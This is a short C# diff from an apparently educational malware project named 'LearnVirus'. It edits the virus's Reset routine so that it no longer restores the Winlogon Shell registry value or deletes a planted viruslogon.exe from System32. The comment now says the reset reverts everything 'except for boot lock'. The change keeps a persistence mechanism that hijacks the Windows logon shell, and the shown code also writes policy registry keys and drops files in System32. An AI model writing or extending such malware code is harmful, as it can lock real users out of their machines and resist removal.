@@ -29,7 +29,7 @@ namespace LearnVirus.Virus
             CMD.RunCMD();
         }
 
-        public static void Reset() //Revert all actions
+        public static void Reset() //Revert all actions except for boot lock
         {
             TaskbarEffect.Reset();
             RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
@@ -45,13 +45,6 @@ namespace LearnVirus.Virus
             try
             {
                 File.Delete(@"C:/Windows/System32/README"); //Delete text file
-            }
-            catch { }
-            try
-            {
-                RegistryKey rk2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
-                rk2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
-                File.Delete(@"C:/Windows/System32/viruslogon.exe"); //Delete viruslogon.exe
             }
             catch { }
         }
